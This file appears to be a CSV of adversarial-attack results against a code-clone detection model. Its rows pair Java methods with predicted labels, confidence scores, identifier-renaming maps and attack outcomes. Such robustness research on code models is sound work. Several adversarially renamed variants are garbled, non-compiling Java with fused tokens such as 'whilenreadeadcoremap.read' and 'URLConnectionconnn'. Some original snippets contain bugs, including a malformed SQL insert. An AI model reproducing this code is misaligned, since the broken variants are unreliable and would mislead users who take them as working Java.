",LABEL_1,LABEL_1,0.5289344787597656,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,13,"decodeFileToFile:decodeFileToFile,infile:infile,outfile:outfile,in:in,out:In,buffer:url,read:read,success:model,",5,GA,449,0.16240665912628174,ga,[]
70,"    @Override
    public void incluir(Igreja igreja) throws Exception {
        Connection connection = criaConexao(false);
        String sql = ""insert into igreja ? as idlocal, ? as possui_salao;"";
        String sql2 = ""SELECT MAX(idlocal) FROM Local"";
        PreparedStatement stmt = null;
        PreparedStatement stmt2 = null;
        ResultSet rs = null;
        try {
            stmt = connection.prepareStatement(sql);
            stmt2 = connection.prepareStatement(sql2);
            rs = stmt2.executeQuery();
            stmt.setInt(1, rs.getInt(""max""));
            stmt.setBoolean(2, igreja.getPossuiSalao());
            int retorno = stmt.executeUpdate();
            if (retorno == 0) {
                connection.rollback();
                throw new SQLException(""Ocorreu um erro inesperado no momento de inserir dados de cliente no banco!"");
            }
            connection.commit();
        } catch (SQLException e) {
            connection.rollback();
            throw e;
        } finally {
            try {
                stmt.close();
                stmt2.close();
                rs.close();
                this.fechaConexao();
            } catch (SQLException e) {
                throw e;
            }
        }
    }
 <SPLIT>     public void deleteObject(String id) throws SQLException {
        boolean selfConnection = true;
        Connection conn = null;
        PreparedStatement stmt = null;
        try {
            if (dbConnection == null) {
                DatabaseConn dbConn = new DatabaseConn();
                conn = dbConn.getConnection();
                conn.setAutoCommit(false);
            } else {
                conn = dbConnection;
                selfConnection = false;
            }
            stmt = conn.prepareStatement(this.deleteSql);
            stmt.setString(1, id);
            stmt.executeUpdate();
            if (selfConnection) conn.commit();
        } catch (Exception e) {
            if (selfConnection && conn != null) conn.rollback();
            throw new SQLException(e.getMessage());
        } finally {
            if (stmt != null) {
                stmt.close();
                stmt = null;
            }
            if (selfConnection && conn != null) {
                conn.close();
                conn = null;
            }
        }
    }
",203,,LABEL_1,LABEL_1,LABEL_1,-1,"incluir,igreja,connection,sql,sql2,stmt,stmt2,rs,retorno",,,,0,,0,GA,2959,1.0805185238520305,failed,[]
71,"    private static void setMembers() {
        try {
            URL url = new URL(getTracUrl() + ""newticket"");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String buffer = reader.readLine();
            while (buffer != null) {
                if (buffer.contains(""<select id=\""component\"" name=\""component\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strComponents = new String[erg.size()];
                    erg.toArray(m_strComponents);
                }
                if (buffer.contains(""<select id=\""priority\"" name=\""priority\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strPriorities = new String[erg.size()];
                    erg.toArray(m_strPriorities);
                }
                buffer = reader.readLine();
            }
        } catch (MalformedURLException e) {
            System.out.println(""e1"");
        } catch (IOException e) {
            System.out.println(e);
        }
    }
 <SPLIT>             @Override
            public void handledRun() throws Throwable {
                try {
                    URL url = new URL(ONLINE_CLIENT_DATA + ""gamedata.xml"");
                    BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                    int lastversion = 0;
                    String readHeader1 = br.readLine();
                    String readHeader2 = br.readLine();
                    String[] parts = readHeader2.split("" "");
                    lastversion = new Integer(parts[1]);
                    GameDatabase.loadVersion();
                    if (GameDatabase.version < lastversion) {
                        Logger.log(LogTypes.LOG, ""Downloading new gamedata"");
                        BufferedOutputStream bo = null;
                        File destfile = new File(GameDatabase.dataFilePath);
                        if (!destfile.createNewFile()) {
                            destfile.delete();
                            destfile.createNewFile();
                        }
                        bo = new BufferedOutputStream(new FileOutputStream(destfile));
                        bo.write((readHeader1 + ""\n"").getBytes());
                        bo.write((readHeader2 + ""\n"").getBytes());
                        int readedbyte;
                        while ((readedbyte = br.read()) != -1) {
                            bo.write(readedbyte);
                        }
                        bo.flush();
                        try {
                            br.close();
                            bo.close();
                        } catch (Exception ex) {
                            Logger.log(ex);
                        }
                    }
                } catch (java.net.UnknownHostException unknownHost) {
                    Logger.log(""Sourceforge is down, cannot update gamedata"");
                } catch (Exception e) {
                    JOptionPane.showMessageDialog(FrameOrganizer.getClientFrame(), ""The gamedata is outdated, but Coopnet couldn't update it!"", ""Gamedata outdated"", JOptionPane.INFORMATION_MESSAGE);
                    throw e;
                } finally {
                    GameDatabase.loadVersion();
                    GameDatabase.load("""", GameDatabase.dataFilePath);
                    GameDatabase.detectGames();
                }
            }
",397,,LABEL_1,LABEL_0,,-4,"setMembers,url,reader,buffer,pattern,matcher,erg,start,von,bis,m_strComponents,m_strPriorities",,,,0,,0,Greedy,1,0.0007617354393005371,,[]
72,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public PhoneSetImpl(URL url) throws IOException {
        BufferedReader reader;
        String line;
        phonesetMap = new HashMap();
        reader = new BufferedReader(new InputStreamReader(url.openStream()));
        line = reader.readLine();
        lineCount++;
        while (line != null) {
            if (!line.startsWith(""***"")) {
                parseAndAdd(line);
            }
            line = reader.readLine();
        }
        reader.close();
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,2909,1.0430004954338075,failed,[]
73,"    public static void DecodeMapFile(String mapFile, String outputFile) throws Exception {
        byte magicKey = 0;
        byte[] buffer = new byte[2048];
        int nread;
        InputStream map;
        OutputStream output;
        try {
            map = new FileInputStream(mapFile);
        } catch (Exception e) {
            throw new Exception(""Map file error"", e);
        }
        try {
            output = new FileOutputStream(outputFile);
        } catch (Exception e) {
            throw new Exception(""Map file error"", e);
        }
        while ((nread = map.read(buffer, 0, 2048)) != 0) {
            for (int i = 0; i < nread; ++i) {
                buffer[i] ^= magicKey;
                magicKey += 43;
            }
            output.write(buffer, 0, nread);
        }
        map.close();
        output.close();
    }
 <SPLIT>     public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",170,"    public static void DecodeMapFile(String mapFile, String outputFile) throws Exception {
        byte magicLetter = 0;
        byte[] url = new byte[2048];
        int nread;
        InputStream core;
        OutputStream sort;
        try {
            core = new FileInputStream(mapFile);
        } catch (Exception e) {
            throw new Exception(""Map file error"", e);
        }
        try {
            sort = new FileOutputStream(outputFile);
        } catch (Exception e) {
            throw new Exception(""Map file error"", e);
        }
        whilenreadeadcoremap.read(url, 0, 2048)) != 0) {
            for (int i = 0; i < nread; ++i) {
                bufurl i= magicLetter;
                magicLetter += 43;
            }
         sortput.write(url, 0, nread);
        }
        core.close();
        sort.close();
    }
",LABEL_1,LABEL_1,0.907794713973999,1,"DecodeMapFile,mapFile,outputFile,magicKey,buffer,nread,map,output,i",,,,13,"DecodeMapFile:DecodeMapFile,mapFile:mapFile,outputFile:outputFile,magicKey:magicLetter,buffer:url,nread:nread,map:core,output:sort,i:i,",5,GA,465,0.170007061958313,ga,[]
74,"    private static boolean setBundleInfoName(String location, List<BundleInfo> list) {
        try {
            URL url = new URL(location);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream(), ""UTF-8""));
            while (true) {
                String line = br.readLine();
                if (line == null) {
                    break;
                }
                int pos1 = line.indexOf('=');
                if (pos1 < 0) {
                    continue;
                }
                String bundleSymbolicName = line.substring(0, pos1);
                String bundleName = line.substring(pos1 + 1);
                for (BundleInfo info : list) {
                    if (info.bundleSymbolicName.equals(bundleSymbolicName)) {
                        info.bundleName = bundleName;
                        break;
                    }
                }
            }
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }
 <SPLIT>     public static URL[] getDirectoryListing(URL url) throws IOException, CancelledOperationException {
        FileSystem.logger.log(Level.FINER, ""listing {0}"", url);
        String file = url.getFile();
        if (file.charAt(file.length() - 1) != '/') {
            url = new URL(url.toString() + '/');
        }
        String userInfo = KeyChain.getDefault().getUserInfo(url);
        URLConnection urlConnection = url.openConnection();
        urlConnection.setAllowUserInteraction(false);
        urlConnection.setConnectTimeout(FileSystem.settings().getConnectTimeoutMs());
        if (userInfo != null) {
            String encode = Base64.encodeBytes(userInfo.getBytes());
            urlConnection.setRequestProperty(""Authorization"", ""Basic "" + encode);
        }
        InputStream urlStream;
        urlStream = urlConnection.getInputStream();
        return getDirectoryListing(url, urlStream);
    }
",168,,LABEL_0,LABEL_0,LABEL_0,-1,"setBundleInfoName,location,list,url,br,line,pos1,bundleSymbolicName,bundleName,info",,,,0,,0,GA,3756,1.3553845445315043,failed,[]
75,"    public void extractResourceToFile(String resourcePath, File dest) {
        InputStream in = getClass().getResourceAsStream(resourcePath);
        try {
            FileOutputStream out = FileUtils.openOutputStream(dest);
            try {
                IOUtils.copy(in, out);
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
 <SPLIT>     public void modifyApplicationMessage(String locale, String messageName, String messageValue) {
        Properties properties = new Properties();
        try {
            String i18nPath = ServerUtil.removelastResourceURL(ConfigurationServiceImpl.class.getResource(""/es/ua/tranube/prototype/main/client/TranubeConstants_en.properties"").getPath()).toString();
            File englishFile = new File(i18nPath + ""TranubeConstants_en.properties"");
            if (!englishFile.exists()) throw new Exception(""English file not found"");
            String propertiesFilePath = i18nPath + ""TranubeConstants_"" + locale + "".properties"";
            File file = new File(propertiesFilePath);
            if (!file.exists()) {
                FileReader in = new FileReader(englishFile);
                FileWriter out = new FileWriter(file);
                int c;
                while ((c = in.read()) != -1) out.write(c);
                in.close();
                out.close();
            }
            InputStream is = ConfigurationServiceImpl.class.getResourceAsStream(""/es/ua/tranube/prototype/main/client/TranubeConstants_"" + locale + "".properties"");
            BufferedReader breader = new BufferedReader(new InputStreamReader(is));
            String line = null;
            StringBuilder strBuilder = new StringBuilder();
            boolean found = false;
            while ((line = breader.readLine()) != null) {
                if (line.startsWith(""#"")) strBuilder.append(line).append(""\n""); else {
                    String[] pieces = line.split(""="");
                    if (pieces.length == 2) {
                        if (pieces[0].trim().equals(messageName)) {
                            strBuilder.append(pieces[0].trim() + "" = "" + messageValue + ""\n"");
                            found = true;
                        } else strBuilder.append(line).append(""\n"");
                    } else strBuilder.append(line).append(""\n"");
                }
            }
            if (!found) strBuilder.append(messageName).append("" = "").append(messageValue).append(""\n"");
            breader.close();
            is.close();
            FileWriter writer = new FileWriter(file);
            writer.write(strBuilder.toString());
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",84,,LABEL_1,LABEL_1,LABEL_1,-1,"extractResourceToFile,resourcePath,dest,in,out",,,,0,,0,GA,1913,0.6966620643933614,failed,[]
76,"    private void setProfile(String loginName, SimpleUserProfile profile) throws MM4UCannotStoreUserProfileException {
        try {
            OutputStream outStream = null;
            URL url = new URL(this.profileURI + profile.getID() + FILE_SUFFIX);
            if (url.getProtocol().equals(""file"")) {
                File file = new File(url.getFile());
                outStream = new FileOutputStream(file);
            } else {
                URLConnection connection = url.openConnection();
                connection.setDoOutput(true);
                outStream = connection.getOutputStream();
            }
            OutputStreamWriter writer = new OutputStreamWriter(outStream);
            Enumeration myEnum = profile.keys();
            while (myEnum.hasMoreElements()) {
                String key = myEnum.nextElement().toString();
                if (key != ""id"") writer.write(key + ""="" + profile.getStringValue(key) + System.getProperty(""line.separator""));
            }
            writer.flush();
            writer.close();
        } catch (Exception e) {
            throw new MM4UCannotStoreUserProfileException(this, ""setProfile"", e.toString());
        }
    }
 <SPLIT>     private IProject createJavaProject() {
        IProject proj = ResourcesPlugin.getWorkspace().getRoot().getProject(""DefaultFolderPropertiesTest"");
        if (!proj.exists()) {
            try {
                proj.create(null);
                proj.open(null);
                IProjectDescription desc = proj.getDescription();
                desc.setNatureIds(new String[] { JavaCore.NATURE_ID });
                proj.setDescription(desc, null);
                IJavaProject javaProject = JavaCore.create(proj);
                javaProject.open(null);
                IFolder srcFolder1 = proj.getFolder(new Path(""src""));
                srcFolder1.create(true, true, null);
                IFolder srcFolder2 = proj.getFolder(new Path(""custom_src""));
                srcFolder2.create(true, true, null);
                IClasspathEntry[] classpathEntries = new IClasspathEntry[] { JavaCore.newSourceEntry(srcFolder1.getFullPath()), JavaCore.newSourceEntry(srcFolder2.getFullPath()), JavaRuntime.getDefaultJREContainerEntry() };
                javaProject.setRawClasspath(classpathEntries, null);
                IFolder binFolder = proj.getFolder(new Path(""bin""));
                if (!binFolder.exists()) {
                    binFolder.create(true, true, null);
                }
                javaProject.setOutputLocation(binFolder.getFullPath(), null);
                IFolder testFolder = proj.getFolder(new Path(""test""));
                testFolder.create(true, true, null);
                IFolder resultFolder = proj.getFolder(new Path(""result""));
                resultFolder.create(true, true, null);
            } catch (CoreException e) {
                fail(e.getMessage());
            }
        }
        return proj;
    }
",219,"    private void SetRole(String loginName, SimpleUserProfile profile) throws MM4UCannotStoreUserProfileException {
        try {
            OutputStream outStream = null;
            URL service = new URL(this.profileURI + profile.getID() + FILE_SUFFIX);
            if (service.getProtocol().equals(""data"")) {
                File filedataew File(service.getFile());
                outStream = new FileOutputStream(data);
            } else {
                URLConnection connrelationervice.openConnection();
                relation.setDoOutput(true);
                outStream = relation.getOutputStream();
            }
            OutputStreamWriter writer = new OutputStreamWriter(outStream);
            Enumeration myEnum = profile.keys();
            while (myEnum.hasMoreElements()) {
                String key = myEnum.nextElement().toString();
                if (key != ""id"") writer.write(key + ""="" + profile.getStringValue(key) + System.getProperty(""line.separator""));
            }
            writer.flush();
            writer.close();
        } catch (Exception e) {
            throw new MM4UCannotStoreUserProfileException(this, ""SetRole"", e.toString());
        }
    }
",LABEL_0,LABEL_0,0.7115986347198486,1,"setProfile,loginName,profile,outStream,url,file,connection,writer,myEnum,key",,,,20,"setProfile:SetRole,loginName:loginName,profile:profile,outStream:outStream,url:service,file:data,connection:relation,writer:writer,myEnum:myEnum,key:key,",6,GA,497,0.18583717743555705,ga,[]
77,"    public ByteBuffer[] write(ByteBuffer[] byteBuffers) {
        if (!m_sslInitiated) {
            return m_writer.write(byteBuffers);
        }
        if (m_engine.getHandshakeStatus() != SSLEngineResult.HandshakeStatus.NOT_HANDSHAKING) {
            if (!NIOUtils.isEmpty(byteBuffers)) {
                m_initialOutBuffer = NIOUtils.concat(m_initialOutBuffer, m_writer.write(byteBuffers));
                byteBuffers = new ByteBuffer[0];
            }
            ByteBuffer buffer = SSL_BUFFER.get();
            ByteBuffer[] buffers = null;
            try {
                SSLEngineResult result = null;
                while (m_engine.getHandshakeStatus() == SSLEngineResult.HandshakeStatus.NEED_WRAP) {
                    buffer.clear();
                    result = m_engine.wrap(byteBuffers, buffer);
                    buffer.flip();
                    buffers = NIOUtils.concat(buffers, NIOUtils.copy(buffer));
                }
                if (result == null) return null;
                if (result.getStatus() != SSLEngineResult.Status.OK) throw new SSLException(""Unexpectedly not ok wrapping handshake data, was "" + result.getStatus());
                reactToHandshakeStatus(result.getHandshakeStatus());
            } catch (SSLException e) {
                throw new RuntimeException(e);
            }
            return buffers;
        }
        ByteBuffer buffer = SSL_BUFFER.get();
        buffer.clear();
        if (NIOUtils.isEmpty(byteBuffers)) {
            if (m_initialOutBuffer == null) return null;
        } else {
            byteBuffers = m_writer.write(byteBuffers);
        }
        if (m_initialOutBuffer != null) {
            byteBuffers = NIOUtils.concat(m_initialOutBuffer, byteBuffers);
            m_initialOutBuffer = null;
        }
        ByteBuffer[] encrypted = null;
        while (!NIOUtils.isEmpty(byteBuffers)) {
            buffer.clear();
            try {
                m_engine.wrap(byteBuffers, buffer);
            } catch (SSLException e) {
                throw new RuntimeException(e);
            }
            buffer.flip();
            encrypted = NIOUtils.concat(encrypted, NIOUtils.copy(buffer));
        }
        return encrypted;
    }
 <SPLIT>     public PageLoader(String pageAddress) throws Exception {
        URL url = new URL(pageAddress);
        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        inputLine = """";
        while (in.ready()) {
            inputLine = inputLine + in.readLine();
        }
        in.close();
    }
",370,,LABEL_0,LABEL_1,,-4,"write,byteBuffers,m_initialOutBuffer,buffer,buffers,result,encrypted",,,,0,,0,Greedy,1,0.0006332635879516601,,[]
78,"    public static String connRemote(JSONObject jsonObject, String OPCode) {
        String retSrc = """";
        try {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(AZConstants.validateURL);
            HttpParams httpParams = new BasicHttpParams();
            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
            nameValuePair.add(new BasicNameValuePair(AZConstants.ACTION_TYPE, OPCode));
            nameValuePair.add(new BasicNameValuePair(AZConstants.PARAM, jsonObject.toString()));
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
            httpPost.setParams(httpParams);
            HttpResponse response = httpClient.execute(httpPost);
            retSrc = EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            Log.e(TAG, e.toString());
        }
        return retSrc;
    }
 <SPLIT>     private static String lastModified(URL url) {
        try {
            URLConnection conn = url.openConnection();
            return long2date(conn.getLastModified());
        } catch (Exception e) {
            SWGAide.printDebug(""cach"", 1, ""SWGCraftCache:lastModified: "" + e.getMessage());
        }
        return ""0"";
    }
",162,,LABEL_0,LABEL_0,LABEL_0,-1,"connRemote,jsonObject,OPCode,retSrc,httpClient,httpPost,httpParams,nameValuePair,response",,,,0,,0,GA,3317,1.1845351219177247,failed,[]
79,"    public void get() {
        try {
            int cnt;
            URL url = new URL(urlStr);
            URLConnection conn = url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(false);
            InputStream is = conn.getInputStream();
            String filename = new File(url.getFile()).getName();
            FileOutputStream fos = new FileOutputStream(dstDir + File.separator + filename);
            byte[] buffer = new byte[4096];
            while ((cnt = is.read(buffer, 0, buffer.length)) != -1) fos.write(buffer, 0, cnt);
            fos.close();
            is.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
 <SPLIT>     public void testReadPerMemberSixSmall() throws IOException {
        GZIPMembersInputStream gzin = new GZIPMembersInputStream(new ByteArrayInputStream(sixsmall_gz));
        gzin.setEofEachMember(true);
        for (int i = 0; i < 3; i++) {
            int count2 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 1-byte member count"", 1, count2);
            gzin.nextMember();
            int count3 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 5-byte member count"", 5, count3);
            gzin.nextMember();
        }
        int countEnd = IOUtils.copy(gzin, new NullOutputStream());
        assertEquals(""wrong eof count"", 0, countEnd);
    }
",156,"    public void get() {
        try {
            int cnt;
            URL ir = new URL(urlStr);
            URLConnectionconnn = ir.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(false);
            InputStream is = conn.getInputStream();
            Stringfilenamee = new File(ir.getFile()).getName();
            FileOutputStream fos = new FileOutputStream(dstDir + File.separator + filename);
            byte[] border = new byte[4096];
            while ((cnt = is.read(border, 0, border.length)) != -1) fos.write(border, 0, cnt);
            fos.close();
            is.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
",LABEL_0,LABEL_0,0.5268003344535828,1,"get,cnt,url,conn,is,filename,fos,buffer",,,,16,"get:get,cnt:cnt,url:ir,conn:conn,is:is,filename:filename,fos:fos,buffer:border,",6,GA,406,0.14740236202875773,ga,[]
80,"    static void copy(String src, String dest) throws IOException {
        File ifp = new File(src);
        File ofp = new File(dest);
        if (ifp.exists() == false) {
            throw new IOException(""file '"" + src + ""' does not exist"");
        }
        FileInputStream fis = new FileInputStream(ifp);
        FileOutputStream fos = new FileOutputStream(ofp);
        byte[] b = new byte[1024];
        while (fis.read(b) > 0) fos.write(b);
        fis.close();
        fos.close();
    }
 <SPLIT>     @Override
    public List<SearchResult> search(String query, SortOrder order, int maxResults) throws Exception {
        if (query == null) {
            return null;
        }
        String encodedQuery = """";
        try {
            encodedQuery = URLEncoder.encode(query, ""UTF-8"");
        } catch (UnsupportedEncodingException e) {
            throw e;
        }
        final int startAt = 0;
        final int pageNr = (startAt - 1) / 30;
        final String url = String.format(QUERYURL, encodedQuery, String.valueOf(pageNr), (order == SortOrder.BySeeders ? SORT_SEEDS : SORT_COMPOSITE));
        HttpParams httpparams = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(httpparams, CONNECTION_TIMEOUT);
        HttpConnectionParams.setSoTimeout(httpparams, CONNECTION_TIMEOUT);
        DefaultHttpClient httpclient = new DefaultHttpClient(httpparams);
        httpclient.getParams().setParameter(""http.useragent"", ""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2"");
        HttpGet httpget = new HttpGet(url);
        HttpResponse response = httpclient.execute(httpget);
        InputStream instream = response.getEntity().getContent();
        String html = HttpHelper.ConvertStreamToString(instream);
        instream.close();
        return parseHtml(html);
    }
",119,,LABEL_0,LABEL_0,LABEL_0,-1,"copy,src,dest,ifp,ofp,fis,fos,b",,,,0,,0,GA,2915,1.0522121389706929,failed,[]
81,"    public void readFile(URL url) throws PedroException, IOException, ParserConfigurationException, SAXException {
        this.zipFileName = url.toString();
        URLConnection urlConnection = url.openConnection();
        InputStream inputStream = urlConnection.getInputStream();
        unzipNativeFormatFile(inputStream);
        parseAlertFiles();
        deleteAlertFiles();
    }
 <SPLIT>     private VelocityEngine newVelocityEngine() {
        VelocityEngine velocityEngine = null;
        InputStream is = null;
        try {
            URL url = ClassPathUtils.getResource(VELOCITY_PROPS_FILE);
            is = url.openStream();
            Properties props = new Properties();
            props.load(is);
            velocityEngine = new VelocityEngine(props);
            velocityEngine.init();
        } catch (Exception e) {
            throw new RuntimeException(""can not find velocity props file, file="" + VELOCITY_PROPS_FILE, e);
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        return velocityEngine;
    }
",60,,LABEL_0,LABEL_0,LABEL_0,-1,"readFile,url,IOException,ParserConfigurationException,SAXException,zipFileName,urlConnection,inputStream",,,,0,,0,GA,2808,0.99250381787618,failed,[]
82,"    public static boolean decodeFileToFile(final String infile, final String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            final byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                out.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     private static void doCopyFile(File srcFile, File destFile, boolean preserveFileDate) throws IOException {
        if (destFile.exists() && destFile.isDirectory()) {
            throw new IOException(""Destination '"" + destFile + ""' exists but is a directory"");
        }
        FileChannel input = new FileInputStream(srcFile).getChannel();
        try {
            FileChannel output = new FileOutputStream(destFile).getChannel();
            try {
                output.transferFrom(input, 0, input.size());
            } finally {
                IOUtil.closeQuietly(output);
            }
        } finally {
            IOUtil.closeQuietly(input);
        }
        if (srcFile.length() != destFile.length()) {
            throw new IOException(""Failed to copy full contents from '"" + srcFile + ""' to '"" + destFile + ""'"");
        }
        if (preserveFileDate) {
            destFile.setLastModified(srcFile.lastModified());
        }
    }
",200,,LABEL_1,LABEL_1,LABEL_1,-1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,2920,1.0561926325162252,failed,[]
83,"    private void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     protected void createSettingsIfNecessary() throws IOException {
        OutputStream out = null;
        try {
            final File fSettings = SettingsUtils.getSettingsFile();
            if (!fSettings.exists()) {
                fSettings.createNewFile();
                final Path src = new Path(""mvn/settings.xml"");
                final InputStream in = FileLocator.openStream(getBundle(), src, false);
                out = new FileOutputStream(SettingsUtils.getSettings(), true);
                IOUtils.copy(in, out);
            } else {
                Logger.getLog().info(""File settings.xml already exists at "" + fSettings);
            }
        } finally {
            if (out != null) {
                out.flush();
                out.close();
            }
        }
    }
",96,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,in,out,inChannel,outChannel",,,,0,,0,GA,1837,0.6515915592511495,failed,[]
84,"    protected String readUrl(String svnUrl) throws IOException {
        URL url = new URL(svnUrl);
        URLConnection uc = url.openConnection();
        if (url.getProtocol().equals(""https"")) {
            String userPassword = user + "":"" + password;
            String encoding = new sun.misc.BASE64Encoder().encode(userPassword.getBytes());
            uc.setRequestProperty(""Authorization"", ""Basic "" + encoding);
        }
        InputStream is = null;
        String in = null;
        try {
            is = uc.getInputStream();
            in = read(is);
        } finally {
            try {
                is.close();
            } catch (Exception e) {
            }
        }
        return in;
    }
 <SPLIT>     public String readReferenceText(final String ident) throws NoContentException {
        try {
            String name = getFilename(ident);
            URL url = new URL(FreqAnalysisPlugin.getDefault().getBundle().getEntry(""/""), name);
            InputStream in = url.openStream();
            InputStreamReader isr = new InputStreamReader(in, ""UTF-8"");
            BufferedReader br = new BufferedReader(isr);
            StringBuffer buffer = new StringBuffer();
            String line = br.readLine();
            while (null != line) {
                buffer.append(line + ""\n"");
                line = br.readLine();
            }
            return buffer.toString();
        } catch (MalformedURLException muEx) {
            logError(muEx);
        } catch (UnsupportedEncodingException ueEx) {
            logError(ueEx);
        } catch (IOException ioEx) {
            logError(ioEx);
        }
        throw new NoContentException(""Unable to find or read reference text."");
    }
",144,,LABEL_0,LABEL_0,LABEL_0,-1,"readUrl,svnUrl,url,uc,userPassword,encoding,is,in",,,,0,,0,GA,2957,1.0606051723162333,failed,[]
85,"    protected String getFileContentAsString(String filePath, String encoding) throws IOException {
        URL testURL = Thread.currentThread().getContextClassLoader().getResource(filePath);
        InputStream input = null;
        StringWriter sw = new StringWriter();
        try {
            if (testURL != null) {
                input = testURL.openStream();
            } else {
                input = new FileInputStream(filePath);
            }
            IOUtils.copy(input, sw, encoding);
        } finally {
            if (input != null) {
                input.close();
            }
        }
        return sw.toString();
    }
 <SPLIT>     @Override
    protected void parseContent(StreamLimiter streamLimiter, LanguageEnum forcedLang) throws IOException {
        String charset = null;
        IndexDocument sourceDocument = getSourceDocument();
        if (sourceDocument != null && urlItemFieldEnum != null) {
            FieldValueItem fieldValueItem = sourceDocument.getFieldValue(urlItemFieldEnum.contentTypeCharset.getName(), 0);
            if (fieldValueItem != null) charset = fieldValueItem.getValue();
            if (charset == null) {
                fieldValueItem = sourceDocument.getFieldValue(urlItemFieldEnum.contentEncoding.getName(), 0);
                if (fieldValueItem != null) charset = fieldValueItem.getValue();
            }
        }
        boolean charsetWasNull = charset == null;
        if (charsetWasNull) charset = getProperty(ClassPropertyEnum.DEFAULT_CHARSET).getValue();
        StringWriter writer = new StringWriter();
        IOUtils.copy(streamLimiter.getNewInputStream(), writer, charset);
        addField(ParserFieldEnum.htmlSource, writer.toString());
        writer.close();
        HtmlDocumentProvider htmlProvider = findBestProvider(charset, streamLimiter);
        if (htmlProvider == null) return;
        addField(ParserFieldEnum.htmlProvider, htmlProvider.getName());
        String contentType = htmlProvider.getMetaHttpEquiv(""content-type"");
        String contentTypeCharset = null;
        if (contentType != null) {
            contentTypeCharset = MimeUtils.extractContentTypeCharset(contentType);
            if (contentTypeCharset != null && !contentTypeCharset.equals(charset)) charsetWasNull = true;
        }
        if (charsetWasNull) {
            if (contentTypeCharset != null) charset = contentTypeCharset; else charset = htmlProvider.getMetaCharset();
            if (charset != null) htmlProvider = findBestProvider(charset, streamLimiter);
        }
        HtmlNodeAbstract<?> rootNode = htmlProvider.getRootNode();
        if (rootNode == null) return;
        for (HtmlNodeAbstract<?> metaNode : htmlProvider.getMetas()) {
            String metaName = metaNode.getAttributeText(""name"");
